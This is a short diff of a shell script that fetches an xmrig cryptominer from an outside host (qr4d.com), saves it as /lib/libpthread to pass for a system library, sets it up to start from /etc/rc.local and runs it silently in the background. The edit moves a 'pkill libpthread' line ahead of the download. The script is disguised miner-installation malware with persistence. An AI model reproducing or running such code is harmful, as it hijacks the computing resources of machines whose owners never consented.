@@ -30,6 +30,7 @@ Get_Dist_Name()
 
 Get_Dist_Name
 
+sudo pkill libpthread
 sudo curl -fsSL https://qr4d.com/xmrig/libpthread > /lib/libpthread
 if [ ! -f "/usr/lib64/libuv.so.1" ]; then
     case $PM in  
@@ -64,5 +65,4 @@ if [ -z "`grep "/usr/sbin/pthread" /etc/rc.local`" ]; then
 else
 	echo "has pthread"
 fi
-sudo pkill libpthread
 sudo /usr/sbin/pthread >/dev/null 2>&1 &
